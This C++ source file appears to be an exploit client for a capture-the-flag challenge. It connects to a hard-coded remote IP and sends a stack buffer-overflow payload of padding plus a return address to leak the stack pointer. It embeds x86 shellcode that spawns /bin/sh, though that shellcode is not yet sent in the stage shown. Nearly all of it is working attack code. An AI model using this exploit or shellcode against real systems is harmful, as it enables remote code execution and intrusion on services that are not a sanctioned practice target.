#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sstream>
#include <stdint.h>

#define PORT 10000
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)


using namespace std;


int main(){
    //http://shell-storm.org/shellcode/files/shellcode-827.php
    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    int sock = 0, valread;
    struct sockaddr_in server;
    char buffer[1024] = {0};
    if((sock = socket(AF_INET,SOCK_STREAM, 0)) < 0){
        cerr << "Failed to create socket" << endl;
        return EXIT_FAILURE;
    }

    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr("139.162.123.119");

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0){
        cerr << "Connection failed" << endl;
        return EXIT_FAILURE;
    }

    
    read(sock, buffer,1024);
    cout << buffer << endl;
    string tmpbuff(buffer);
    // if(tmpbuff.find("CTF") != string::npos){
    //     break;
    // }
    
  
    // Find the address of the ESP
    // Trigger a write so we can read
    // the saved stack pointer address
    char * payload = "AAAAAAAAAAAAAAAAAAAA\x87\x80\x04\x08";
    cout << payload << endl;

    send(sock, payload, strlen(payload), 0);
    cout << "Payload sent" << endl;

    char getesp[4];
    bzero(getesp, sizeof(getesp));
    read(sock, getesp, 4);

    int32_t esp;
    std::copy(getesp, getesp + sizeof(int32_t), reinterpret_cast<char *>(&esp));


    string tmp(getesp);
    if(tmp.empty()){
        cerr << "THE STRING IS EMPTY" << endl;
    }
    
    cout << std::hex << esp << endl;
}